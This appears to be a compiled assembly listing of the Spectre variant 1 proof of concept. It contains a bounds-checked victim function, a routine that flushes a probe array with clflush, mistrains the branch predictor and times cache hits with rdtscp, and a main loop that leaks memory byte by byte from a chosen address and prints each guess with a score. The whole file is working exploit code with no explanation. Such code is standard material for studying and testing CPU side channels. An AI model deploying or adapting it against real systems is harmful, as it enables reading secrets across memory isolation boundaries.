array1_size:
        .long   16
array1:
        .string "\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
        .zero   143
array2:
        .zero   131072
.LC0:
        .string "This code uses the Spectre vulnerability to access kernel memory"
secret:
        .quad   .LC0
temp:
        .zero   1
victim_function:
        push    rbp
        mov     rbp, rsp
        mov     QWORD PTR [rbp-8], rdi
        mov     eax, DWORD PTR array1_size[rip]
        mov     eax, eax
        cmp     QWORD PTR [rbp-8], rax
        jnb     .L3
        mov     rax, QWORD PTR [rbp-8]
        add     rax, OFFSET FLAT:array1
        movzx   eax, BYTE PTR [rax]
        movzx   eax, al
        sal     eax, 9
        cdqe
        movzx   edx, BYTE PTR array2[rax]
        movzx   eax, BYTE PTR temp[rip]
        and     eax, edx
        mov     BYTE PTR temp[rip], al
.L3:
        nop
        pop     rbp
        ret
readMemoryByte:
        push    rbp
        mov     rbp, rsp
        push    r12
        push    rbx
        sub     rsp, 120
        mov     QWORD PTR [rbp-120], rdi
        mov     QWORD PTR [rbp-128], rsi
        mov     QWORD PTR [rbp-136], rdx
        mov     DWORD PTR [rbp-100], 0
        mov     DWORD PTR [rbp-24], 0
        jmp     .L5
.L6:
        mov     eax, DWORD PTR [rbp-24]
        cdqe
        mov     DWORD PTR results.0[0+rax*4], 0
        add     DWORD PTR [rbp-24], 1
.L5:
        cmp     DWORD PTR [rbp-24], 255
        jle     .L6
        mov     DWORD PTR [rbp-20], 999
        jmp     .L7
.L27:
        mov     DWORD PTR [rbp-24], 0
        jmp     .L8
.L9:
        mov     eax, DWORD PTR [rbp-24]
        sal     eax, 9
        cdqe
        add     rax, OFFSET FLAT:array2
        mov     QWORD PTR [rbp-72], rax
        mov     rax, QWORD PTR [rbp-72]
        clflush [rax]
        nop
        add     DWORD PTR [rbp-24], 1
.L8:
        cmp     DWORD PTR [rbp-24], 255
        jle     .L9
        mov     eax, DWORD PTR [rbp-20]
        mov     ecx, DWORD PTR array1_size[rip]
        mov     edx, 0
        div     ecx
        mov     eax, edx
        mov     eax, eax
        mov     QWORD PTR [rbp-40], rax
        mov     DWORD PTR [rbp-28], 29
        jmp     .L10
.L13:
        mov     QWORD PTR [rbp-80], OFFSET FLAT:array1_size
        mov     rax, QWORD PTR [rbp-80]
        clflush [rax]
        nop
        mov     DWORD PTR [rbp-104], 0
        jmp     .L11
.L12:
        mov     eax, DWORD PTR [rbp-104]
        add     eax, 1
        mov     DWORD PTR [rbp-104], eax
.L11:
        mov     eax, DWORD PTR [rbp-104]
        cmp     eax, 99
        jle     .L12
        mov     ecx, DWORD PTR [rbp-28]
        movsx   rax, ecx
        imul    rax, rax, 715827883
        shr     rax, 32
        mov     rdx, rax
        mov     eax, ecx
        sar     eax, 31
        sub     edx, eax
        mov     eax, edx
        add     eax, eax
        add     eax, edx
        add     eax, eax
        sub     ecx, eax
        mov     edx, ecx
        lea     eax, [rdx-1]
        mov     ax, 0
        cdqe
        mov     QWORD PTR [rbp-64], rax
        mov     rax, QWORD PTR [rbp-64]
        shr     rax, 16
        or      QWORD PTR [rbp-64], rax
        mov     rax, QWORD PTR [rbp-120]
        xor     rax, QWORD PTR [rbp-40]
        and     rax, QWORD PTR [rbp-64]
        xor     rax, QWORD PTR [rbp-40]
        mov     QWORD PTR [rbp-64], rax
        mov     rax, QWORD PTR [rbp-64]
        mov     rdi, rax
        call    victim_function
        sub     DWORD PTR [rbp-28], 1
.L10:
        cmp     DWORD PTR [rbp-28], 0
        jns     .L13
        mov     DWORD PTR [rbp-24], 0
        jmp     .L14
.L18:
        mov     eax, DWORD PTR [rbp-24]
        imul    eax, eax, 167
        add     eax, 13
        and     eax, 255
        mov     DWORD PTR [rbp-44], eax
        mov     eax, DWORD PTR [rbp-44]
        sal     eax, 9
        cdqe
        add     rax, OFFSET FLAT:array2
        mov     QWORD PTR [rbp-56], rax
        lea     rax, [rbp-100]
        mov     QWORD PTR [rbp-96], rax
        rdtscp
        mov     esi, ecx
        mov     rcx, QWORD PTR [rbp-96]
        mov     DWORD PTR [rcx], esi
        sal     rdx, 32
        or      rax, rdx
        mov     r12, rax
        mov     rax, QWORD PTR [rbp-56]
        movzx   eax, BYTE PTR [rax]
        movzx   eax, al
        mov     DWORD PTR [rbp-100], eax
        lea     rax, [rbp-100]
        mov     QWORD PTR [rbp-88], rax
        rdtscp
        mov     esi, ecx
        mov     rcx, QWORD PTR [rbp-88]
        mov     DWORD PTR [rcx], esi
        sal     rdx, 32
        or      rax, rdx
        sub     rax, r12
        mov     rbx, rax
        cmp     rbx, 120
        ja      .L17
        mov     eax, DWORD PTR [rbp-20]
        mov     ecx, DWORD PTR array1_size[rip]
        mov     edx, 0
        div     ecx
        mov     eax, edx
        mov     eax, eax
        movzx   eax, BYTE PTR array1[rax]
        movzx   eax, al
        cmp     DWORD PTR [rbp-44], eax
        je      .L17
        mov     eax, DWORD PTR [rbp-44]
        cdqe
        mov     eax, DWORD PTR results.0[0+rax*4]
        lea     edx, [rax+1]
        mov     eax, DWORD PTR [rbp-44]
        cdqe
        mov     DWORD PTR results.0[0+rax*4], edx
.L17:
        add     DWORD PTR [rbp-24], 1
.L14:
        cmp     DWORD PTR [rbp-24], 255
        jle     .L18
        mov     DWORD PTR [rbp-32], -1
        mov     eax, DWORD PTR [rbp-32]
        mov     DWORD PTR [rbp-28], eax
        mov     DWORD PTR [rbp-24], 0
        jmp     .L19
.L24:
        cmp     DWORD PTR [rbp-28], 0
        js      .L20
        mov     eax, DWORD PTR [rbp-24]
        cdqe
        mov     edx, DWORD PTR results.0[0+rax*4]
        mov     eax, DWORD PTR [rbp-28]
        cdqe
        mov     eax, DWORD PTR results.0[0+rax*4]
        cmp     edx, eax
        jl      .L21
.L20:
        mov     eax, DWORD PTR [rbp-28]
        mov     DWORD PTR [rbp-32], eax
        mov     eax, DWORD PTR [rbp-24]
        mov     DWORD PTR [rbp-28], eax
        jmp     .L22
.L21:
        cmp     DWORD PTR [rbp-32], 0
        js      .L23
        mov     eax, DWORD PTR [rbp-24]
        cdqe
        mov     edx, DWORD PTR results.0[0+rax*4]
        mov     eax, DWORD PTR [rbp-32]
        cdqe
        mov     eax, DWORD PTR results.0[0+rax*4]
        cmp     edx, eax
        jl      .L22
.L23:
        mov     eax, DWORD PTR [rbp-24]
        mov     DWORD PTR [rbp-32], eax
.L22:
        add     DWORD PTR [rbp-24], 1
.L19:
        cmp     DWORD PTR [rbp-24], 255
        jle     .L24
        mov     eax, DWORD PTR [rbp-32]
        cdqe
        mov     eax, DWORD PTR results.0[0+rax*4]
        add     eax, 2
        lea     edx, [rax+rax]
        mov     eax, DWORD PTR [rbp-28]
        cdqe
        mov     eax, DWORD PTR results.0[0+rax*4]
        cmp     edx, eax
        jl      .L25
        mov     eax, DWORD PTR [rbp-28]
        cdqe
        mov     eax, DWORD PTR results.0[0+rax*4]
        cmp     eax, 2
        jne     .L26
        mov     eax, DWORD PTR [rbp-32]
        cdqe
        mov     eax, DWORD PTR results.0[0+rax*4]
        test    eax, eax
        je      .L25
.L26:
        sub     DWORD PTR [rbp-20], 1
.L7:
        cmp     DWORD PTR [rbp-20], 0
        jg      .L27
.L25:
        mov     edx, DWORD PTR results.0[rip]
        mov     eax, DWORD PTR [rbp-100]
        xor     eax, edx
        mov     DWORD PTR results.0[rip], eax
        mov     eax, DWORD PTR [rbp-28]
        mov     edx, eax
        mov     rax, QWORD PTR [rbp-128]
        mov     BYTE PTR [rax], dl
        mov     eax, DWORD PTR [rbp-28]
        cdqe
        mov     edx, DWORD PTR results.0[0+rax*4]
        mov     rax, QWORD PTR [rbp-136]
        mov     DWORD PTR [rax], edx
        mov     rax, QWORD PTR [rbp-128]
        add     rax, 1
        mov     edx, DWORD PTR [rbp-32]
        mov     BYTE PTR [rax], dl
        mov     rax, QWORD PTR [rbp-136]
        lea     rdx, [rax+4]
        mov     eax, DWORD PTR [rbp-32]
        cdqe
        mov     eax, DWORD PTR results.0[0+rax*4]
        mov     DWORD PTR [rdx], eax
        nop
        add     rsp, 120
        pop     rbx
        pop     r12
        pop     rbp
        ret
.LC1:
        .string "%p"
.LC2:
        .string "%d"
.LC3:
        .string "0x%02X='%c' score=%d "
.LC4:
        .string "(second best: 0x%02X score=%d)"
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 48
        mov     DWORD PTR [rbp-36], edi
        mov     QWORD PTR [rbp-48], rsi
        mov     rax, QWORD PTR secret[rip]
        sub     rax, OFFSET FLAT:array1
        mov     QWORD PTR [rbp-16], rax
        mov     DWORD PTR [rbp-28], 40
        mov     DWORD PTR [rbp-4], 0
        jmp     .L29
.L30:
        mov     eax, DWORD PTR [rbp-4]
        cdqe
        mov     BYTE PTR array2[rax], 1
        add     DWORD PTR [rbp-4], 1
.L29:
        mov     eax, DWORD PTR [rbp-4]
        cmp     eax, 131071
        jbe     .L30
        cmp     DWORD PTR [rbp-36], 3
        jne     .L32
        mov     rax, QWORD PTR [rbp-48]
        add     rax, 8
        mov     rax, QWORD PTR [rax]
        lea     rdx, [rbp-16]
        mov     esi, OFFSET FLAT:.LC1
        mov     rdi, rax
        mov     eax, 0
        call    __isoc99_sscanf
        mov     rax, QWORD PTR [rbp-16]
        mov     edx, OFFSET FLAT:array1
        sub     rax, rdx
        mov     QWORD PTR [rbp-16], rax
        mov     rax, QWORD PTR [rbp-48]
        add     rax, 16
        mov     rax, QWORD PTR [rax]
        lea     rdx, [rbp-28]
        mov     esi, OFFSET FLAT:.LC2
        mov     rdi, rax
        mov     eax, 0
        call    __isoc99_sscanf
        jmp     .L32
.L36:
        mov     rax, QWORD PTR [rbp-16]
        lea     rdx, [rax+1]
        mov     QWORD PTR [rbp-16], rdx
        lea     rdx, [rbp-24]
        lea     rcx, [rbp-30]
        mov     rsi, rcx
        mov     rdi, rax
        call    readMemoryByte
        mov     edx, DWORD PTR [rbp-24]
        movzx   eax, BYTE PTR [rbp-30]
        cmp     al, 31
        jbe     .L33
        movzx   eax, BYTE PTR [rbp-30]
        cmp     al, 126
        ja      .L33
        movzx   eax, BYTE PTR [rbp-30]
        movzx   eax, al
        jmp     .L34
.L33:
        mov     eax, 63
.L34:
        movzx   ecx, BYTE PTR [rbp-30]
        movzx   esi, cl
        mov     ecx, edx
        mov     edx, eax
        mov     edi, OFFSET FLAT:.LC3
        mov     eax, 0
        call    printf
        mov     eax, DWORD PTR [rbp-20]
        test    eax, eax
        jle     .L35
        mov     edx, DWORD PTR [rbp-20]
        movzx   eax, BYTE PTR [rbp-29]
        movzx   eax, al
        mov     esi, eax
        mov     edi, OFFSET FLAT:.LC4
        mov     eax, 0
        call    printf
.L35:
        mov     edi, 10
        call    putchar
.L32:
        mov     eax, DWORD PTR [rbp-28]
        sub     eax, 1
        mov     DWORD PTR [rbp-28], eax
        mov     eax, DWORD PTR [rbp-28]
        test    eax, eax
        jns     .L36
        mov     eax, 0
        leave
        ret
